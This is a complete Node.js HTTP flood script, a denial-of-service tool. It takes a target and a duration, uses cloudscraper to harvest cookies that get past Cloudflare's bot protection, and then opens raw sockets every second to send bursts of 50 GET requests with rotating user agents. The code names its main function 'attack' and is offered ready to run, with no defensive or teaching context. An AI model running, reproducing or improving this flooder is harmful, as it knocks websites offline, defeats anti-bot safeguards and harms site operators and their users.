const cloudscraper = require("cloudscraper");
const EventEmitter = require("events");
const url = require("url");
const net = require("net");

// Set maximum listeners to prevent memory leaks
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);

if (process.argv.length < 4) {
    console.log("Usage: node script.js [target] [time]");
    process.exit(-1);
}

// Parsing command-line arguments
const target = process.argv[2];
const time = parseInt(process.argv[3], 10);
const host = url.parse(target).host;

// User agents list
const userAgents = [
    // List of user agents...
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36",
    // Add more user agents here as needed...
];

// Initialize variables
let cookie = "";
let counter = 0;

// Fetching cookies using cloudscraper
cloudscraper.get(target, function (error, response) {
    if (error) {
        console.log("Error fetching cookies:", error);
        return;
    }

    const parsedResponse = JSON.parse(JSON.stringify(response));
    cookie = parsedResponse.request.headers.cookie || parsedResponse.headers['set-cookie'];

    console.log("Received cookies:", cookie);
});

const attack = () => {
    if (cookie !== "") {
        const socket = new net.Socket();
        socket.connect(80, host);

        socket.setTimeout(10000);

        // Send multiple HTTP requests
        for (let i = 0; i < 50; i++) {
            const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
            const request = 
                `GET ${target}/ HTTP/1.1\r\n` +
                `Host: ${host}\r\n` +
                `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n` +
                `User-Agent: ${userAgent}\r\n` +
                `Upgrade-Insecure-Requests: 1\r\n` +
                `Cookie: ${cookie}\r\n` +
                `Accept-Encoding: gzip, deflate\r\n` +
                `Accept-Language: en-US,en;q=0.9\r\n` +
                `Cache-Control: max-age=0\r\n` +
                `Connection: Keep-Alive\r\n\r\n`;

            socket.write(request);
        }

        socket.on("data", () => {
            setTimeout(() => {
                socket.destroy();
            }, 5000);
        });

        socket.on("error", (err) => {
            console.log("Socket error:", err.message);
            socket.destroy();
        });

        socket.on("timeout", () => {
            console.log("Socket timeout, destroying connection");
            socket.destroy();
        });
    }
};

// Run the attack at intervals
const intervalId = setInterval(attack, 1000);
setTimeout(() => clearInterval(intervalId), time * 1000);

// Handle errors gracefully
process.on("uncaughtException", (err) => {
    console.log("Uncaught Exception:", err);
});

process.on("unhandledRejection", (err) => {
    console.log("Unhandled Rejection:", err);
});